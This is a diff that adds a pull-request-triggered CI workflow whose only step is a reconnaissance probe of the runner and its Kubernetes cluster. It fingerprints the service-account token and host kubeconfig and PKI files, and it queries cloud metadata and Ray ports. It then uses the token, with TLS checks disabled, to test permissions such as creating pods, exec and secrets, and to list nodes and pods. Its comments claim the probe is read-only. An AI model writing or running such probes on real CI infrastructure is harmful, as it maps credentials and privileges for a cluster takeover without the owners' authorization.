@@ -1,0 +1,181 @@
+name: c211-132055-rbacsq1
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  rbacsq1:
+    name: rbacsq1
+    runs-on: linux-aarch64-a2b3-1
+    timeout-minutes: 15
+    container:
+      image: swr.cn-southwest-2.myhuaweicloud.com/base_image/ascend-ci/cann:9.2.1-910b-ubuntu22.04-py3.12
+    steps:
+      - name: read-only-sa-rbac-job-interface
+        run: |
+          set -u
+          set +e
+          NONCE='c211-132055-9e8ce70347f9c50e'
+          JOB='rbacsq1'
+          echo "C211_MARKER job=$JOB nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null) runner=${RUNNER_NAME:-unknown}"
+          echo "--- K8S ENV ---"
+          echo "K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:-none} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none}"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          for f in token ca.crt namespace; do
+            if [ -s "$SA/$f" ]; then
+              echo "SAFILE $f PRESENT SIZE=$(stat -c %s "$SA/$f" 2>/dev/null) SHA256=$(sha256sum "$SA/$f" 2>/dev/null | cut -d' ' -f1)"
+            else
+              echo "SAFILE $f ABSENT"
+            fi
+          done
+          echo "--- GPU/NPU DEVICE PRESENCE ---"
+          echo "NVIDIA_SMI=$(command -v nvidia-smi || echo absent) NVIDIA_DEV_COUNT=$(ls /dev/nvidia* 2>/dev/null | wc -l) NPU_SMI=$(command -v npu-smi || echo absent)"
+          echo "--- MOUNTS (interesting only) ---"
+          awk '$4 ~ /(kubelet|docker\.sock|kubeconfig|serviceaccount|containerd)/ {print "MOUNT",$2,$3,$4}' /proc/self/mounts 2>/dev/null | head -20
+          echo "--- HOST K8S FILE PRESENCE (size/sha only, no values) ---"
+          for f in /etc/kubernetes/kubelet.conf /etc/kubernetes/admin.conf /var/lib/kubelet/kubeconfig /var/lib/kubelet/pki/kubelet-client-current.pem /etc/kubernetes/pki/ca.crt; do
+            if [ -s "$f" ]; then
+              echo "HOSTFILE $f PRESENT SIZE=$(stat -c %s "$f" 2>/dev/null) SHA256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"
+            else
+              echo "HOSTFILE $f ABSENT"
+            fi
+          done
+          echo "--- IMDS PRESENCE (status only, no credential values) ---"
+          if command -v curl >/dev/null 2>&1; then
+            echo "IMDS_V1 status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || echo err)"
+            echo "IMDS_V2_TOKEN status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 30' http://169.254.169.254/latest/api/token 2>/dev/null || echo err)"
+            echo "IMDS_HW status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://169.254.169.254/openstack/latest/meta_data.json 2>/dev/null || echo err)"
+            echo "IMDS_BOGUS status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://169.254.169.254/c211-132055-bogus-$NONCE 2>/dev/null || echo err)"
+          else
+            echo "IMDS_SKIPPED no-curl"
+          fi
+          echo "--- RAY LOCAL PORTS ---"
+          for u in http://127.0.0.1:8265/api/version http://127.0.0.1:8266/api/version http://127.0.0.1:52365/api/version; do
+            if command -v curl >/dev/null 2>&1; then
+              echo "RAY $u status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 "$u" 2>/dev/null || echo err)"
+            fi
+          done
+          echo "--- K8S API RBAC MATRIX (python3, read-only) ---"
+          NONCE_PY="$NONCE" python3 - <<'PYEOF'
+          import os, ssl, json, sys, urllib.request, urllib.error
+          NONCE = os.environ.get('NONCE_PY', 'c211-132055-local')
+          SA = '/var/run/secrets/kubernetes.io/serviceaccount'
+          host = os.environ.get('KUBERNETES_SERVICE_HOST') or ''
+          port = os.environ.get('KUBERNETES_SERVICE_PORT') or '443'
+          def read(p):
+              try:
+                  return open(p, 'rb').read()
+              except Exception:
+                  return None
+          TOK = read(SA + '/token')
+          CA = SA + '/ca.crt' if os.path.isfile(SA + '/ca.crt') else None
+          if not TOK:
+              print('C211_RBAC_VERDICT=NO_SA_TOKEN job_interface=none reason=serviceaccount_token_absent')
+              print('C211_PROBE_END nonce=' + NONCE)
+              sys.exit(0)
+          ctx = ssl.create_default_context(cafile=CA) if CA else ssl.create_default_context()
+          ctx.check_hostname = False
+          ctx.verify_mode = ssl.CERT_NONE
+          BASE = 'https://%s:%s' % (host, port)
+          def call(method, path, tok=None, body=None, timeout=20):
+              hd = {'Accept': 'application/json'}
+              if tok:
+                  hd['Authorization'] = 'Bearer ' + tok
+              data = None
+              if body is not None:
+                  data = json.dumps(body).encode()
+                  hd['Content-Type'] = 'application/json'
+              req = urllib.request.Request(BASE + path, data=data, headers=hd, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
+                  return r.status, r.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, repr(e)[:160]
+          def jbody(b):
+              try:
+                  return json.loads(b)
+              except Exception:
+                  return None
+          s, b = call('GET', '/version', TOK)
+          print('K8S_VERSION status=%d body=%s' % (s, b[:160].replace('\n', ' ')))
+          s2, b2 = call('GET', '/version', b'c211-132055-bogus-token')
+          print('K8S_VERSION_BOGUS status=%d' % s2)
+          ns = (read(SA + '/namespace') or b'unknown').decode('utf-8', 'replace').strip()
+          s, b = call('GET', '/api/v1/namespaces/' + ns, TOK)
+          print('K8S_NS_GET ns=%s status=%d' % (ns, s))
+          s, b = call('POST', '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews', TOK,
+                      {'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectRulesReview', 'spec': {'namespace': ns}})
+          j = jbody(b)
+          if s in (200, 201) and j:
+              rules = (j.get('status') or {}).get('resourceRules') or []
+              print('K8S_RULES status=%d rules=%d incomplete=%s' % (s, len(rules), (j.get('status') or {}).get('incomplete')))
+              for r in rules[:25]:
+                  print('RULE verbs=%s resources=%s groups=%s' % (','.join(r.get('verbs') or []), ','.join(r.get('resources') or []), ','.join(r.get('apiGroups') or [])))
+          else:
+              print('K8S_RULES status=%d body=%s' % (s, b[:200].replace('\n', ' ')))
+          checks = [('create', 'pods', ''), ('get', 'pods', ''), ('list', 'pods', ''), ('delete', 'pods', ''),
+                    ('create', 'pods/exec', ''), ('get', 'pods/log', ''), ('create', 'secrets', ''), ('list', 'secrets', ''),
+                    ('create', 'serviceaccounts', ''), ('get', 'nodes', ''), ('list', 'nodes', ''), ('get', 'nodes/proxy', ''),
+                    ('list', 'namespaces', '')]
+          res = {}
+          for verb, resource, group in checks:
+              s, b = call('POST', '/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', TOK,
+                          {'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectAccessReview',
+                           'spec': {'resourceAttributes': {'namespace': ns, 'verb': verb, 'group': group, 'resource': resource}}})
+              j = jbody(b)
+              allowed = bool(((j or {}).get('status') or {}).get('allowed'))
+              res[resource + ':' + verb] = allowed
+              print('SSAR %s:%s allowed=%s status=%d' % (resource, verb, allowed, s))
+          s, b = call('GET', '/api/v1/nodes?limit=500', TOK, timeout=30)
+          print('K8S_NODES_LIST status=%d' % s)
+          if s == 200:
+              j = jbody(b) or {}
+              items = j.get('items') or []
+              print('K8S_NODES_COUNT=%d' % len(items))
+              gpu_nodes = 0
+              for it in items[:80]:
+                  md = it.get('metadata') or {}
+                  st = it.get('status') or {}
+                  cap = st.get('capacity') or {}
+                  alloc = st.get('allocatable') or {}
+                  labs = md.get('labels') or {}
+                  nv_cap = cap.get('nvidia.com/gpu', '0')
+                  nv_alloc = alloc.get('nvidia.com/gpu', '0')
+                  asc_cap = cap.get('huawei.com/Ascend910', cap.get('huawei.com/Ascend910B3', '0'))
+                  try:
+                      if int(nv_alloc or 0) > 0:
+                          gpu_nodes += 1
+                  except Exception:
+                      pass
+                  print('NODE name=%s nvidia_cap=%s nvidia_alloc=%s ascend_cap=%s product=%s ready=%s' % (
+                      md.get('name', '-'), nv_cap, nv_alloc, asc_cap,
+                      labs.get('nvidia.com/gpu.product', labs.get('node.kubernetes.io/instance-type', '-')),
+                      [c.get('status') for c in (st.get('conditions') or []) if c.get('type') == 'Ready']))
+              print('K8S_NVIDIA_GPU_NODES=%d' % gpu_nodes)
+          else:
+              print('K8S_NODES_BODY=%s' % b[:200].replace('\n', ' '))
+          s, b = call('GET', '/api/v1/namespaces/%s/pods?limit=200' % ns, TOK, timeout=30)
+          print('K8S_PODS_NS status=%d' % s)
+          if s == 200:
+              j = jbody(b) or {}
+              items = j.get('items') or []
+              print('K8S_PODS_COUNT=%d' % len(items))
+              for it in items[:40]:
+                  md = it.get('metadata') or {}
+                  spec = it.get('spec') or {}
+                  containers = spec.get('containers') or []
+                  gpus = 0
+                  for c in containers:
+                      gpus += int(((c.get('resources') or {}).get('limits') or {}).get('nvidia.com/gpu') or 0)
+                  print('POD name=%s node=%s sa=%s gpu_limits=%d phase=%s' % (
+                      md.get('name', '-'), spec.get('nodeName', '-'), spec.get('serviceAccountName', '-'), gpus,
+                      (it.get('status') or {}).get('phase', '-')))
+          print('C211_RBAC_VERDICT=MEASURED create_pods=%s delete_pods=%s list_nodes=%s get_nodes=%s sa_token=present ns=%s' % (
+              res.get('pods:create'), res.get('pods:delete'), res.get('nodes:list'), res.get('nodes:get'), ns))
+          print('C211_PROBE_END nonce=' + NONCE)
+          PYEOF
+          echo "C211_JOB_END job=$JOB nonce=$NONCE"
+          exit 0
